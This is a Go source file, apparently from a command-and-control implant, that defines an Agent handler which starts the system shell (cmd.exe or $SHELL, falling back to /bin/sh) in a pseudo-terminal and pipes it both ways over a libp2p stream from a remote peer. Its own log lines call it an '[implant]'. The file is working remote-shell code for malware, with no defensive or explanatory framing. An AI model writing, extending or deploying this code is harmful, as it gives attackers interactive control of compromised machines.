package core

import (
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"

	"github.com/creack/pty"
	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	shell := shellPath()
	cmd := exec.Command(shell)
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")

	f, err := pty.StartWithSize(cmd, &pty.Winsize{Rows: 30, Cols: 120})
	if err != nil {
		log.Printf("[implant] pty start: %v", err)
		return
	}
	defer f.Close()

	go func() {
		io.Copy(f, s)
	}()
	io.Copy(s, f)

	log.Printf("[implant] shell session ended for %s", remotePeer.String())
}

func shellPath() string {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe"
	default:
		sh, ok := os.LookupEnv("SHELL")
		if ok {
			return sh
		}
		return "/bin/sh"
	}
}
